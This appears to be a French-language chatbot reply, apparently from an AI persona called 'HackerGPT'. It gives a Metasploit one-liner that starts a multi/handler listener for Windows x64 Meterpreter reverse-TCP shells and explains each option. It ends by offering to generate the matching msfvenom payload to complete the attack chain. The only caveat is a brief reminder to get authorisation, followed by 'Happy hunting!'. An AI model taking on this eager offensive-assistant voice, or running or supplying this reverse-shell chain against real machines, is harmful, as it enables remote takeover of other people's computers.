# 🛠️ Commande optimisée (One-liner) Si tu veux lancer le tout directement depuis ton terminal : 

*```bash msfconsole -x "use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT 4444; set PAYLOAD windows/x64/meterpreter/reverse_tcp; exploit -j" 

## 1. **`set LPORT 4444`** : C'est le port sur lequel ton listener attendra le "call back". Assure-toi que ce port est ouvert dans ton firewall local.
## 2. **`set PAYLOAD ...`** : C'est l'étape cruciale. Le handler doit savoir *quel type* de connexion il va recevoir. Ici, j'ai mis un Meterpreter pour Windows 64-bit, mais il faut l'adapter à ton vecteur d'attaque (ex: `linux/x64/shell/reverse_tcp` pour du Linux).
## 3. **`exploit -j`** : L'option `-j` (Job) permet de lancer le handler en arrière-plan. C'est très pratique si tu prévois de gérer plusieurs sessions simultanément. 

### 💡 Le conseil de HackerGPT Si tu es sur un réseau local et que ta cible est sur une autre machine, n'oublie pas que ton **payload** (le fichier exécuté sur la cible) doit pointer vers ton **IP spécifique** (ex: `192.168.1.X`), 
## Même si ton **handler** écoute sur `0.0.0.0`. **On passe à l'étape suivante ?**
### Est-ce qu'on doit générer le payload correspondant avec `msfvenom` pour finaliser la chaîne ? 

### ⚠️ *Rappel : Assure-toi d'avoir l'autorisation explicite pour tester la cible. Happy hunting!*